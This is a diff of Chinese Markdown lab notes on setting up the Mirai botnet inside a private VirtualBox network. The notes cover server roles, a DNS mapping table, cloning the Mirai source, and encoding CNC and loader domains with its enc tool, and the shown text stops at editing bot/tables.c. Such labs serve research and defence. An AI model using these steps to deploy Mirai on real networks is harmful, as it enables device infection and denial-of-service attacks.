@@ -1,31 +1,45 @@
-服务器配置：
-一台ubuntu服务器：CNC+MYSQL
-一台ubuntu服务器：LOADER(REPORT)
-一台ubuntu服务器：bot（作为感染机，和cnc进行通讯产生流量，并且扫描其他服务器）
-一台windows server 2008R服务器：用于域名映射（必须要做，因为我们用内网需要配置DNS）
+# 服务器配置：
+- 一台ubuntu服务器：CNC+MYSQL
+- 一台ubuntu服务器：LOADER(REPORT)
+- 一台ubuntu服务器：bot（作为感染机，和cnc进行通讯产生流量，并且扫描其他服务器）
+- 一台windows server 2008R服务器：用于域名映射（必须要做，因为我们用内网需要配置DNS）
 
-首先对每个ubuntu服务器进行初始化
+# ubuntu初始化
 1.	如果是virtualbox安装增强功能，可以自动调节窗口大小
 2.	先进行更新：sudo apt update
 3.	安装vim,ifconfig,ssh命令：sudo apt-get install vim net-tools openssh-server
 4.	安装telnet：sudo apt-get install openbsd-inetd telnetd -y
 5.	安装编译环境：sudo apt-get install git gcc golang electric-fence build-essential
 
+# DNS服务器搭建
 搭载一个DNS服务器，配置域名
-搭建详情看DNS服务器搭建
-cnc.mirai.com 192.168.56.101
-loader.mirai.com 192.168.56.102
 
-配置CNC服务器：
-下载mirai:
+| 域名 | 地址 |
+| :--- | ---: |
+| cnc.mirai.com | 192.168.56.101 |
+|loader.mirai.com | 192.168.56.102 |
+
+# 配置CNC服务器：
+### 下载mirai:
+```shell
 git clone https://github.com/jgamblin/Mirai-Source-Code
-编译加密工具
+```
+
+
+### 编译加密工具
+```shell
 cd Mirai-Source-Code/mirai/tools && gcc enc.c -o enc.out
-编译域名
+```
+
+### 编译域名
+
+```shell
 ./enc.out string cnc.mirai.com
 \x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
 ./enc.out string loader.mirai.com
 \x4E\x4D\x43\x46\x47\x50\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
+```
+
 更改代码：
 vim bot/tables.c
  
